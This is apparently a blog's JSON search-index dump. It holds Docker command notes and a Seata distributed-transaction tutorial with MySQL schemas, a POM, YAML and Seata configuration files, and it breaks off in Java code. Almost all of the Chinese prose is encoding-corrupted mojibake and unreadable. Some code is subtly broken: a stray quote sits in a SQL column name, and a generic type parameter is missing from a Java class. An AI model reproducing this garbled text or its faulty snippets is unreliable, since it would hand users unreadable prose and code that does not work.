:é™é»˜æ¨¡å¼ï¼Œåªæ˜¾ç¤ºå®¹å™¨ç¼–å·ã€‚ --no-trunc :ä¸æˆªæ–­è¾“å‡ºã€‚ é€€å‡ºå®¹å™¨ ä¸¤ç§é€€å‡ºæ–¹å¼ exit å®¹å™¨åœæ­¢é€€å‡º ctrl+P+Q å®¹å™¨ä¸åœæ­¢é€€å‡º å¯åŠ¨å®¹å™¨ docker start å®¹å™¨IDæˆ–è€…å®¹å™¨å é‡å¯å®¹å™¨ docker restart å®¹å™¨IDæˆ–è€…å®¹å™¨å åœæ­¢å®¹å™¨ docker stop å®¹å™¨IDæˆ–è€…å®¹å™¨å å¼ºåˆ¶åœæ­¢å®¹å™¨ docker kill å®¹å™¨IDæˆ–è€…å®¹å™¨å åˆ é™¤å·²åœæ­¢çš„å®¹å™¨ docker rm å®¹å™¨ID ä¸€æ¬¡æ€§åˆ é™¤å¤šä¸ªå®¹å™¨ docker rm -f $(docker ps -a -q) docker ps -a -q | xargs docker rm é‡è¦ å¯åŠ¨å®ˆæŠ¤å¼å®¹å™¨ docker run -d å®¹å™¨å ---------------------------- #ä½¿ç”¨é•œåƒcentos:latestä»¥åå°æ¨¡å¼å¯åŠ¨ä¸€ä¸ªå®¹å™¨ docker run -d centos é—®é¢˜ï¼šç„¶ådocker ps -a è¿›è¡ŒæŸ¥çœ‹, ä¼šå‘ç°å®¹å™¨å·²ç»é€€å‡º å¾ˆé‡è¦çš„è¦è¯´æ˜çš„ä¸€ç‚¹: Dockerå®¹å™¨åå°è¿è¡Œ,å°±å¿…é¡»æœ‰ä¸€ä¸ªå‰å°è¿›ç¨‹. å®¹å™¨è¿è¡Œçš„å‘½ä»¤å¦‚æœä¸æ˜¯é‚£äº›ä¸€ç›´æŒ‚èµ·çš„å‘½ä»¤ï¼ˆæ¯”å¦‚è¿è¡Œtopï¼Œtailï¼‰ï¼Œå°±æ˜¯ä¼šè‡ªåŠ¨é€€å‡ºçš„ã€‚ è¿™ä¸ªæ˜¯dockerçš„æœºåˆ¶é—®é¢˜,æ¯”å¦‚ä½ çš„webå®¹å™¨,æˆ‘ä»¬ä»¥nginxä¸ºä¾‹ï¼Œæ­£å¸¸æƒ…å†µä¸‹,æˆ‘ä»¬é…ç½®å¯åŠ¨æœåŠ¡åªéœ€è¦å¯åŠ¨å“åº”çš„serviceå³å¯ã€‚ä¾‹å¦‚ service nginx start ä½†æ˜¯,è¿™æ ·åš,nginxä¸ºåå°è¿›ç¨‹æ¨¡å¼è¿è¡Œ,å°±å¯¼è‡´dockerå‰å°æ²¡æœ‰è¿è¡Œçš„åº”ç”¨, è¿™æ ·çš„å®¹å™¨åå°å¯åŠ¨å,ä¼šç«‹å³è‡ªæ€å› ä¸ºä»–è§‰å¾—ä»–æ²¡äº‹å¯åšäº†. æ‰€ä»¥ï¼Œæœ€ä½³çš„è§£å†³æ–¹æ¡ˆæ˜¯,å°†ä½ è¦è¿è¡Œçš„ç¨‹åºä»¥å‰å°è¿›ç¨‹çš„å½¢å¼è¿è¡Œ æŸ¥çœ‹å®¹å™¨æ—¥å¿— docker logs -f -t --tail å®¹å™¨ID docker run -d centos /bin/sh -c â€œwhile true;do echo hello zzyy;sleep 2;doneâ€ 1 -t æ˜¯åŠ å…¥æ—¶é—´æˆ³ -f è·Ÿéšæœ€æ–°çš„æ—¥å¿—æ‰“å° â€”tail æ•°å­— æ˜¾ç¤ºæœ€åå¤šå°‘æ¡ 1598606975626 æŸ¥çœ‹å®¹å™¨å†…è¿è¡Œçš„è¿›ç¨‹ docker top å®¹å™¨ID æŸ¥çœ‹å®¹å™¨å†…éƒ¨ç»†èŠ‚ docker inspect å®¹å™¨ID è¿›å…¥æ­£åœ¨è¿è¡Œçš„å®¹å™¨å¹¶ä»¥å‘½ä»¤è¡Œäº¤äº’ docker exec -it å®¹å™¨ID bashShell é‡æ–°è¿›å…¥docker attach å®¹å™¨ID ä¸Šè¿°ä¸¤ä¸ªåŒºåˆ« attach ç›´æ¥è¿›å…¥å®¹å™¨å¯åŠ¨å‘½ä»¤çš„ç»ˆç«¯ï¼Œä¸ä¼šå¯åŠ¨æ–°çš„è¿›ç¨‹ exec æ˜¯åœ¨å®¹å™¨ä¸­æ‰“å¼€æ–°çš„ç»ˆç«¯ï¼Œå¹¶ä¸”å¯ä»¥å¯åŠ¨æ–°çš„è¿›ç¨‹ ä»å®¹å™¨å†…æ‹·è´æ–‡ä»¶åˆ°ä¸»æœºä¸Š docker cp å®¹å™¨ID:å®¹å™¨å†…è·¯å¾„ ç›®çš„ä¸»æœºè·¯å¾„ 1598607114510 å°æ€»ç»“ 1598607164719 attach Attach to a running container # å½“å‰ shell ä¸‹ attach è¿æ¥æŒ‡å®šè¿è¡Œé•œåƒ build Build an image from a Dockerfile # é€šè¿‡ Dockerfile å®šåˆ¶é•œåƒ commit Create a new image from a container changes # æäº¤å½“å‰å®¹å™¨ä¸ºæ–°çš„é•œåƒ cp Copy files/folders from the containers filesystem to the host path #ä»å®¹å™¨ä¸­æ‹·è´æŒ‡å®šæ–‡ä»¶æˆ–è€…ç›®å½•åˆ°å®¿ä¸»æœºä¸­ create Create a new container # åˆ›å»ºä¸€ä¸ªæ–°çš„å®¹å™¨ï¼ŒåŒ runï¼Œä½†ä¸å¯åŠ¨å®¹å™¨ diff Inspect changes on a container&#39;s filesystem # æŸ¥çœ‹ docker å®¹å™¨å˜åŒ– events Get real time events from the server # ä» docker æœåŠ¡è·å–å®¹å™¨å®æ—¶äº‹ä»¶ exec Run a command in an existing container # åœ¨å·²å­˜åœ¨çš„å®¹å™¨ä¸Šè¿è¡Œå‘½ä»¤ export Stream the contents of a container as a tar archive # å¯¼å‡ºå®¹å™¨çš„å†…å®¹æµä½œä¸ºä¸€ä¸ª tar å½’æ¡£æ–‡ä»¶[å¯¹åº” import ] history Show the history of an image # å±•ç¤ºä¸€ä¸ªé•œåƒå½¢æˆå†å² images List images # åˆ—å‡ºç³»ç»Ÿå½“å‰é•œåƒ import Create a new filesystem image from the contents of a tarball # ä»taråŒ…ä¸­çš„å†…å®¹åˆ›å»ºä¸€ä¸ªæ–°çš„æ–‡ä»¶ç³»ç»Ÿæ˜ åƒ[å¯¹åº”export] info Display system-wide information # æ˜¾ç¤ºç³»ç»Ÿç›¸å…³ä¿¡æ¯ inspect Return low-level information on a container # æŸ¥çœ‹å®¹å™¨è¯¦ç»†ä¿¡æ¯ kill Kill a running container # kill æŒ‡å®š docker å®¹å™¨ load Load an image from a tar archive # ä»ä¸€ä¸ª tar åŒ…ä¸­åŠ è½½ä¸€ä¸ªé•œåƒ[å¯¹åº” save] login Register or Login to the docker registry server # æ³¨å†Œæˆ–è€…ç™»é™†ä¸€ä¸ª docker æºæœåŠ¡å™¨ logout Log out from a Docker registry server # ä»å½“å‰ Docker registry é€€å‡º logs Fetch the logs of a container # è¾“å‡ºå½“å‰å®¹å™¨æ—¥å¿—ä¿¡æ¯ port Lookup the public-facing port which is NAT-ed to PRIVATE_PORT # æŸ¥çœ‹æ˜ å°„ç«¯å£å¯¹åº”çš„å®¹å™¨å†…éƒ¨æºç«¯å£ pause Pause all processes within a container # æš‚åœå®¹å™¨ ps List containers # åˆ—å‡ºå®¹å™¨åˆ—è¡¨ pull Pull an image or a repository from the docker registry server # ä»dockeré•œåƒæºæœåŠ¡å™¨æ‹‰å–æŒ‡å®šé•œåƒæˆ–è€…åº“é•œåƒ push Push an image or a repository to the docker registry server # æ¨é€æŒ‡å®šé•œåƒæˆ–è€…åº“é•œåƒè‡³dockeræºæœåŠ¡å™¨ restart Restart a running container # é‡å¯è¿è¡Œçš„å®¹å™¨ rm Remove one or more containers # ç§»é™¤ä¸€ä¸ªæˆ–è€…å¤šä¸ªå®¹å™¨ rmi Remove one or more images # ç§»é™¤ä¸€ä¸ªæˆ–å¤šä¸ªé•œåƒ[æ— å®¹å™¨ä½¿ç”¨è¯¥é•œåƒæ‰å¯åˆ é™¤ï¼Œå¦åˆ™éœ€åˆ é™¤ç›¸å…³å®¹å™¨æ‰å¯ç»§ç»­æˆ– -f å¼ºåˆ¶åˆ é™¤] run Run a command in a new container # åˆ›å»ºä¸€ä¸ªæ–°çš„å®¹å™¨å¹¶è¿è¡Œä¸€ä¸ªå‘½ä»¤ save Save an image to a tar archive # ä¿å­˜ä¸€ä¸ªé•œåƒä¸ºä¸€ä¸ª tar åŒ…[å¯¹åº” load] search Search for an image on the Docker Hub # åœ¨ docker hub ä¸­æœç´¢é•œåƒ start Start a stopped containers # å¯åŠ¨å®¹å™¨ stop Stop a running containers # åœæ­¢å®¹å™¨ tag Tag an image into a repository # ç»™æºä¸­é•œåƒæ‰“æ ‡ç­¾ top Lookup the running processes of a container # æŸ¥çœ‹å®¹å™¨ä¸­è¿è¡Œçš„è¿›ç¨‹ä¿¡æ¯ unpause Unpause a paused container # å–æ¶ˆæš‚åœå®¹å™¨ version Show the docker version information # æŸ¥çœ‹ docker ç‰ˆæœ¬å· wait Block until a container stops, then print its exit code # æˆªå–å®¹å™¨åœæ­¢æ—¶çš„é€€å‡ºçŠ¶æ€å€¼","categories":[{"name":"linux","slug":"linux","permalink":"https://blog.kayleh.top/categories/linux/"}],"tags":[{"name":"docker","slug":"docker","permalink":"https://blog.kayleh.top/tags/docker/"}]},{"title":"SnowFlakeåˆ†å¸ƒå¼IDé›ªèŠ±ç®—æ³•","slug":"SnowFlakeåˆ†å¸ƒå¼IDé›ªèŠ±ç®—æ³•(ing)","date":"2020-08-28T00:20:50.000Z","updated":"2021-04-11T17:11:28.420Z","comments":true,"path":"SnowFlakeåˆ†å¸ƒå¼IDé›ªèŠ±ç®—æ³•(ing)/","link":"","permalink":"https://blog.kayleh.top/SnowFlake%E5%88%86%E5%B8%83%E5%BC%8FID%E9%9B%AA%E8%8A%B1%E7%AE%97%E6%B3%95(ing)/","excerpt":"","text":"","categories":[],"tags":[{"name":"algorithm","slug":"algorithm","permalink":"https://blog.kayleh.top/tags/algorithm/"}]},{"title":"Seataå¤„ç†åˆ†å¸ƒå¼äº‹åŠ¡","slug":"Seataå¤„ç†åˆ†å¸ƒå¼äº‹åŠ¡","date":"2020-08-25T20:25:48.000Z","updated":"2021-04-11T17:11:28.398Z","comments":true,"path":"Seataå¤„ç†åˆ†å¸ƒå¼äº‹åŠ¡/","link":"","permalink":"https://blog.kayleh.top/Seata%E5%A4%84%E7%90%86%E5%88%86%E5%B8%83%E5%BC%8F%E4%BA%8B%E5%8A%A1/","excerpt":"Seata","text":"Seata åˆ†å¸ƒå¼äº‹åŠ¡é—®é¢˜åˆ†å¸ƒå¼å‰ å•æœºå•åº“æ²¡è¿™ä¸ªé—®é¢˜ ä»1ï¼š1 -&gt; 1:N -&gt; N: N åˆ†å¸ƒå¼ä¹‹å 1598416105757 1598416133712 ä¸€æ¬¡ä¸šåŠ¡æ“ä½œéœ€è¦è·¨å¤šä¸ªæ•°æ®æºæˆ–éœ€è¦è·¨å¤šä¸ªç³»ç»Ÿè¿›è¡Œè¿œç¨‹è°ƒç”¨ï¼Œå°±ä¼šäº§ç”Ÿåˆ†å¸ƒå¼äº‹åŠ¡é—®é¢˜ Seataç®€ä»‹æ˜¯ä»€ä¹ˆ Seataæ˜¯ä¸€æ¬¾å¼€æºçš„åˆ†å¸ƒå¼äº‹åŠ¡è§£å†³æ–¹æ¡ˆï¼Œè‡´åŠ›äºåœ¨å¾®æœåŠ¡æ¶æ„ä¸‹æä¾›é«˜æ€§èƒ½å’Œç®€å•æ˜“ç”¨çš„åˆ†å¸ƒå¼äº‹åŠ¡æœåŠ¡ http://seata.io/zh-cn/ èƒ½å¹²å˜›ä¸€ä¸ªå…¸å‹çš„åˆ†å¸ƒå¼äº‹åŠ¡è¿‡ç¨‹åˆ†å¸ƒå¼äº‹åŠ¡å¤„ç†è¿‡ç¨‹çš„-ID+ä¸‰ç»„ä»¶æ¨¡å‹ Transaction ID XID å…¨å±€å”¯ä¸€çš„äº‹åŠ¡ID 3ç»„ä»¶æ¦‚å¿µ Transaction Coordinator(TC) äº‹åŠ¡åè°ƒå™¨ï¼Œç»´æŠ¤å…¨å±€äº‹åŠ¡çš„è¿è¡ŒçŠ¶æ€ï¼Œè´Ÿè´£åè°ƒå¹¶é©±åŠ¨å…¨å±€äº‹åŠ¡çš„æäº¤æˆ–å›æ»š; Transaction Manager(TM) æ§åˆ¶å…¨å±€äº‹åŠ¡çš„è¾¹ç•Œï¼Œè´Ÿè´£å¼€å¯ä¸€ä¸ªå…¨å±€äº‹åŠ¡ï¼Œå¹¶æœ€ç»ˆå‘èµ·å…¨å±€æäº¤æˆ–å…¨å±€å›æ»šçš„å†³è®®; Resource Manager(RM) æ§åˆ¶åˆ†æ”¯äº‹åŠ¡ï¼Œè´Ÿè´£åˆ†æ”¯æ³¨å†Œï¼ŒçŠ¶æ€æ±‡æŠ¥ï¼Œå¹¶æ¥æ”¶äº‹åŠ¡åè°ƒå™¨çš„æŒ‡ä»¤ï¼Œé©±åŠ¨åˆ†æ”¯ï¼ˆæœ¬åœ°ï¼‰äº‹åŠ¡çš„æäº¤å’Œå›æ»šï¼› å¤„ç†è¿‡ç¨‹1598416360363 1598416368793 ä¸‹è½½ å‘å¸ƒè¯´æ˜:https://github.com/seata/seata/releases æ€ä¹ˆç”¨ Spring æœ¬åœ°@Transactional å…¨å±€@GlobalTransactional SEATAçš„åˆ†å¸ƒå¼äº¤æ˜“è§£å†³æ–¹æ¡ˆ 1598416447489 Seata-Serverå®‰è£… http://seata.io/zh-cn/ ä¸‹è½½ç‰ˆæœ¬ seata-server-0.9.0.zipè§£å‹åˆ°æŒ‡å®šç›®å½•å¹¶ä¿®æ”¹confç›®å½•ä¸‹çš„file.confé…ç½®æ–‡ä»¶ å…ˆå¤‡ä»½åŸå§‹file.confæ–‡ä»¶ ä¸»è¦ä¿®æ”¹ï¼šè‡ªå®šä¹‰äº‹åŠ¡ç»„åç§°+äº‹åŠ¡æ—¥å¿—å­˜å‚¨æ¨¡å¼ä¸ºdb+æ•°æ®åº“è¿æ¥ä¿¡æ¯ file.conf serviceæ¨¡å— vgroup_mapping.my_test_tx_group = &quot;fsp_tx_group&quot; storeæ¨¡å— mode = &quot;db&quot; url = &quot;jdbc:mysql://127.0.0.1:3306/seata&quot; user = &quot;root&quot; password = &quot;ä½ è‡ªå·±çš„å¯†ç &quot; mysql5.7æ•°æ®åº“æ–°å»ºåº“seata åœ¨seataåº“é‡Œå»ºè¡¨ å»ºè¡¨db_store.sqlåœ¨\\seata-server-0.9.0\\seata\\confç›®å½•é‡Œé¢(1.0ç‰ˆæœ¬åœ¨readme.mdé‡Œé¢) db_store.sql SQL -- the table to store GlobalSession data drop table if exists `global_table`; create table `global_table` ( `xid` varchar(128) not null, `transaction_id` bigint, `status` tinyint not null, `application_id` varchar(32), `transaction_service_group` varchar(32), `transaction_name` varchar(128), `timeout` int, `begin_time` bigint, `application_data` varchar(2000), `gmt_create` datetime, `gmt_modified` datetime, primary key (`xid`), key `idx_gmt_modified_status` (`gmt_modified`, `status`), key `idx_transaction_id` (`transaction_id`) ); -- the table to store BranchSession data drop table if exists `branch_table`; create table `branch_table` ( `branch_id` bigint not null, `xid` varchar(128) not null, `transaction_id` bigint , `resource_group_id` varchar(32), `resource_id` varchar(256) , `lock_key` varchar(128) , `branch_type` varchar(8) , `status` tinyint, `client_id` varchar(64), `application_data` varchar(2000), `gmt_create` datetime, `gmt_modified` datetime, primary key (`branch_id`), key `idx_xid` (`xid`) ); -- the table to store lock data drop table if exists `lock_table`; create table `lock_table` ( `row_key` varchar(128) not null, `xid` varchar(96), `transaction_id` long , `branch_id` long, `resource_id` varchar(256) , `table_name` varchar(32) , `pk` varchar(36) , `gmt_create` datetime , `gmt_modified` datetime, primary key(`row_key`) ); ä¿®æ”¹seata-server-0.9.0\\seata\\confç›®å½•ä¸‹çš„registry.confé…ç½®æ–‡ä»¶ registry { # file ã€nacos ã€eurekaã€redisã€zkã€consulã€etcd3ã€sofa type = &quot;nacos&quot; nacos { serverAddr = &quot;localhost:8848&quot; namespace = &quot;&quot; cluster = &quot;default&quot; } ç›®çš„æ˜¯ï¼šæŒ‡æ˜æ³¨å†Œä¸­å¿ƒä¸ºnacosï¼ŒåŠä¿®æ”¹nacosè¿æ¥ä¿¡æ¯ å…ˆå¯åŠ¨Nacosç«¯å£å·8848 å†å¯åŠ¨seata-server softs\\seata-server-0.9.0\\seata\\bin seata-server.bat è®¢å•/åº“å­˜/è´¦æˆ·ä¸šåŠ¡æ•°æ®åº“å‡†å¤‡ä»¥ä¸‹æ¼”ç¤ºéƒ½éœ€è¦å…ˆå¯åŠ¨Nacosåå¯åŠ¨Seataï¼Œä¿è¯ä¸¤ä¸ªéƒ½OK Seataæ²¡å¯åŠ¨æŠ¥é”™no available server to connect åˆ†å¸ƒå¼äº‹åŠ¡ä¸šåŠ¡è¯´æ˜ä¸šåŠ¡è¯´æ˜ 1598416862715 ä¸‹è®¢å•â€”&gt;æ‰£åº“å­˜â€”&gt;å‡è´¦æˆ·ï¼ˆä½™é¢ï¼‰ åˆ›å»ºä¸šåŠ¡æ•°æ®åº“seata_order: å­˜å‚¨è®¢å•çš„æ•°æ®åº“seata_storage:å­˜å‚¨åº“å­˜çš„æ•°æ®åº“seata_account: å­˜å‚¨è´¦æˆ·ä¿¡æ¯çš„æ•°æ®åº“å»ºè¡¨SQLCREATE DATABASE seata_orderï¼› CREATE DATABASE seata_storageï¼› CREATE DATABASE seata_accountï¼› æŒ‰ç…§ä¸Šè¿°3åº“åˆ†åˆ«å»ºå¯¹åº”ä¸šåŠ¡è¡¨seata_orderåº“ä¸‹å»ºt_orderè¡¨ CREATE TABLE t_order( `id` BIGINT(11) NOT NULL AUTO_INCREMENT PRIMARY KEY, `user_id` BIGINT(11) DEFAULT NULL COMMENT &#39;ç”¨æˆ·id&#39;, `product_id` BIGINT(11) DEFAULT NULL COMMENT &#39;äº§å“id&#39;, `count` INT(11) DEFAULT NULL COMMENT &#39;æ•°é‡&#39;, `money` DECIMAL(11,0) DEFAULT NULL COMMENT &#39;é‡‘é¢&#39;, `status` INT(1) DEFAULT NULL COMMENT &#39;è®¢å•çŠ¶æ€ï¼š0ï¼šåˆ›å»ºä¸­; 1ï¼šå·²å®Œç»“&#39; ) ENGINE=INNODB AUTO_INCREMENT=7 DEFAULT CHARSET=utf8; SELECT * FROM t_order; seata_storageåº“ä¸‹å»ºt_storageè¡¨ CREATE TABLE t_storage( `id` BIGINT(11) NOT NULL AUTO_INCREMENT PRIMARY KEY, `product_id` BIGINT(11) DEFAULT NULL COMMENT &#39;äº§å“id&#39;, `&#39;total` INT(11) DEFAULT NULL COMMENT &#39;æ€»åº“å­˜&#39;, `used` INT(11) DEFAULT NULL COMMENT &#39;å·²ç”¨åº“å­˜&#39;, `residue` INT(11) DEFAULT NULL COMMENT &#39;å‰©ä½™åº“å­˜&#39; ) ENGINE=INNODB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8; INSERT INTO seata_storage.t_storage(`id`,`product_id`,`total`,`used`,`residue`) VALUES(&#39;1&#39;,&#39;1&#39;,&#39;100&#39;,&#39;0&#39;,&#39;100&#39;); SELECT * FROM t_storage; seata_accountåº“ä¸‹å»ºt_accountè¡¨ CREATE TABLE t_account( `id` BIGINT(11) NOT NULL AUTO_INCREMENT PRIMARY KEY COMMENT &#39;id&#39;, `user_id` BIGINT(11) DEFAULT NULL COMMENT &#39;ç”¨æˆ·id&#39;, `total` DECIMAL(10,0) DEFAULT NULL COMMENT &#39;æ€»é¢åº¦&#39;, `used` DECIMAL(10,0) DEFAULT NULL COMMENT &#39;å·²ç”¨ä½™é¢&#39;, `residue` DECIMAL(10,0) DEFAULT &#39;0&#39; COMMENT &#39;å‰©ä½™å¯ç”¨é¢åº¦&#39; ) ENGINE=INNODB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8; INSERT INTO seata_account.t_account(`id`,`user_id`,`total`,`used`,`residue`) VALUES(&#39;1&#39;,&#39;1&#39;,&#39;1000&#39;,&#39;0&#39;,&#39;1000&#39;) SELECT * FROM t_account; æŒ‰ç…§ä¸Šè¿°3åº“åˆ†åˆ«å»ºå¯¹åº”çš„å›æ»šæ—¥å¿—è¡¨è®¢å•-åº“å­˜-è´¦æˆ·3ä¸ªåº“ä¸‹éƒ½éœ€è¦å»ºå„è‡ªçš„å›æ»šæ—¥å¿—è¡¨ \\seata-server-0.9.0\\seata\\confç›®å½•ä¸‹çš„db_undo_log.sql å»ºè¡¨SQL drop table `undo_log`; CREATE TABLE `undo_log` ( `id` bigint(20) NOT NULL AUTO_INCREMENT, `branch_id` bigint(20) NOT NULL, `xid` varchar(100) NOT NULL, `context` varchar(128) NOT NULL, `rollback_info` longblob NOT NULL, `log_status` int(11) NOT NULL, `log_created` datetime NOT NULL, `log_modified` datetime NOT NULL, `ext` varchar(100) DEFAULT NULL, PRIMARY KEY (`id`), UNIQUE KEY `ux_undo_log` (`xid`,`branch_id`) ) ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8; æœ€ç»ˆæ•ˆæœ1598417026767 è®¢å•/åº“å­˜/è´¦æˆ·ä¸šåŠ¡å¾®æœåŠ¡å‡†å¤‡ ä¸šåŠ¡éœ€æ±‚ä¸‹è®¢å•-&gt;å‡åº“å­˜-&gt;æ‰£ä½™é¢-&gt;æ”¹ï¼ˆè®¢å•ï¼‰çŠ¶æ€ æ–°å»ºè®¢å•Order-Module seata-order-service2001 POM &lt;dependencies&gt; &lt;!--nacos--&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-discovery&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--seata--&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-seata&lt;/artifactId&gt; &lt;exclusions&gt; &lt;exclusion&gt; &lt;artifactId&gt;seata-all&lt;/artifactId&gt; &lt;groupId&gt;io.seata&lt;/groupId&gt; &lt;/exclusion&gt; &lt;/exclusions&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;io.seata&lt;/groupId&gt; &lt;artifactId&gt;seata-all&lt;/artifactId&gt; &lt;version&gt;0.9.0&lt;/version&gt; &lt;/dependency&gt; &lt;!--feign--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-openfeign&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--web-actuator--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--mysql-druid--&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;version&gt;5.1.37&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;druid-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;1.1.10&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis.spring.boot&lt;/groupId&gt; &lt;artifactId&gt;mybatis-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;2.0.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;/dependencies&gt; 3.YML server: port: 2001 spring: application: name: seata-order-service cloud: alibaba: seata: #è‡ªå®šä¹‰äº‹åŠ¡ç»„åç§°éœ€è¦ä¸seata-serverä¸­çš„å¯¹åº” tx-service-group: fsp_tx_group nacos: discovery: server-addr: localhost:8848 datasource: driver-class-name: com.mysql.jdbc.Driver url: jdbc:mysql://localhost:3306/seata_order username: root password: 1111111 feign: hystrix: enabled: false logging: level: io: seata: info mybatis: mapperLocations: classpath:mapper/*.xml 4.file.conf transport { # tcp udt unix-domain-socket type = &quot;TCP&quot; #NIO NATIVE server = &quot;NIO&quot; #enable heartbeat heartbeat = true #thread factory for netty thread-factory { boss-thread-prefix = &quot;NettyBoss&quot; worker-thread-prefix = &quot;NettyServerNIOWorker&quot; server-executor-thread-prefix = &quot;NettyServerBizHandler&quot; share-boss-worker = false client-selector-thread-prefix = &quot;NettyClientSelector&quot; client-selector-thread-size = 1 client-worker-thread-prefix = &quot;NettyClientWorkerThread&quot; # netty boss thread size,will not be used for UDT boss-thread-size = 1 #auto default pin or 8 worker-thread-size = 8 } shutdown { # when destroy server, wait seconds wait = 3 } serialization = &quot;seata&quot; compressor = &quot;none&quot; } service { vgroup_mapping.fsp_tx_group = &quot;default&quot; default.grouplist = &quot;127.0.0.1:8091&quot; enableDegrade = false disable = false max.commit.retry.timeout = &quot;-1&quot; max.rollback.retry.timeout = &quot;-1&quot; disableGlobalTransaction = false } client { async.commit.buffer.limit = 10000 lock { retry.internal = 10 retry.times = 30 } report.retry.count = 5 tm.commit.retry.count = 1 tm.rollback.retry.count = 1 } ## transaction log store store { ## store mode: fileã€db mode = &quot;db&quot; ## file store file { dir = &quot;sessionStore&quot; # branch session size , if exceeded first try compress lockkey, still exceeded throws exceptions max-branch-session-size = 16384 # globe session size , if exceeded throws exceptions max-global-session-size = 512 # file buffer size , if exceeded allocate new buffer file-write-buffer-cache-size = 16384 # when recover batch read size session.reload.read_size = 100 # async, sync flush-disk-mode = async } ## database store db { ## the implement of javax.sql.DataSource, such as DruidDataSource(druid)/BasicDataSource(dbcp) etc. datasource = &quot;dbcp&quot; ## mysql/oracle/h2/oceanbase etc. db-type = &quot;mysql&quot; driver-class-name = &quot;com.mysql.jdbc.Driver&quot; url = &quot;jdbc:mysql://127.0.0.1:3306/seata&quot; user = &quot;root&quot; password = &quot;123456&quot; min-conn = 1 max-conn = 3 global.table = &quot;global_table&quot; branch.table = &quot;branch_table&quot; lock-table = &quot;lock_table&quot; query-limit = 100 } } lock { ## the lock store mode: localã€remote mode = &quot;remote&quot; local { ## store locks in user&#39;s database } remote { ## store locks in the seata&#39;s server } } recovery { #schedule committing retry period in milliseconds committing-retry-period = 1000 #schedule asyn committing retry period in milliseconds asyn-committing-retry-period = 1000 #schedule rollbacking retry period in milliseconds rollbacking-retry-period = 1000 #schedule timeout retry period in milliseconds timeout-retry-period = 1000 } transaction { undo.data.validation = true undo.log.serialization = &quot;jackson&quot; undo.log.save.days = 7 #schedule delete expired undo_log in milliseconds undo.log.delete.period = 86400000 undo.log.table = &quot;undo_log&quot; } ## metrics settings metrics { enabled = false registry-type = &quot;compact&quot; # multi exporters use comma divided exporter-list = &quot;prometheus&quot; exporter-prometheus-port = 9898 } support { ## spring spring { # auto proxy the DataSource bean datasource.autoproxy = false } } 5.registry.conf registry { # file ã€nacos ã€eurekaã€redisã€zkã€consulã€etcd3ã€sofa type = &quot;nacos&quot; nacos { serverAddr = &quot;localhost:8848&quot; namespace = &quot;&quot; cluster = &quot;default&quot; } eureka { serviceUrl = &quot;http://localhost:8761/eureka&quot; application = &quot;default&quot; weight = &quot;1&quot; } redis { serverAddr = &quot;localhost:6379&quot; db = &quot;0&quot; } zk { cluster = &quot;default&quot; serverAddr = &quot;127.0.0.1:2181&quot; session.timeout = 6000 connect.timeout = 2000 } consul { cluster = &quot;default&quot; serverAddr = &quot;127.0.0.1:8500&quot; } etcd3 { cluster = &quot;default&quot; serverAddr = &quot;http://localhost:2379&quot; } sofa { serverAddr = &quot;127.0.0.1:9603&quot; application = &quot;default&quot; region = &quot;DEFAULT_ZONE&quot; datacenter = &quot;DefaultDataCenter&quot; cluster = &quot;default&quot; group = &quot;SEATA_GROUP&quot; addressWaitTime = &quot;3000&quot; } file { name = &quot;file.conf&quot; } } config { # fileã€nacos ã€apolloã€zkã€consulã€etcd3 type = &quot;file&quot; nacos { serverAddr = &quot;localhost&quot; namespace = &quot;&quot; } consul { serverAddr = &quot;127.0.0.1:8500&quot; } apollo { app.id = &quot;seata-server&quot; apollo.meta = &quot;http://192.168.1.204:8801&quot; } zk { serverAddr = &quot;127.0.0.1:2181&quot; session.timeout = 6000 connect.timeout = 2000 } etcd3 { serverAddr = &quot;http://localhost:2379&quot; } file { name = &quot;file.conf&quot; } } 6.domain CommonResult ```javapackage com.kayleh.springcloud.alibaba.domain; import lombok.AllArgsConstructor;import lombok.Data;import lombok.NoArgsConstructor; @Data @AllArgsConstructor @NoArgsConstructor public class CommonResult { private Integer code; private String message; private T data; public CommonResult(Integer code, String message) { this(code,message,null); } } - Order ```java package com.kayleh.springcloud.alibaba.domain; import lombok.AllArgsConstructor; import lombok.Data; import lombok.NoArgsConstructor; import java.math.BigDecimal; @Data @AllArgsConstructor @NoArgsConstructor public class Order { private Long id; private Long userId; private Long productId; private Integer count; private BigDecimal money; private Integer status; //è®¢å•çŠ¶æ€ï¼š0ï¼šåˆ›å»ºä¸­ï¼›1ï¼šå·²å®Œç»“ } 7.Daoæ¥å£åŠå®ç° OrderDao package com.kayleh.springcloud.alibaba.dao; import 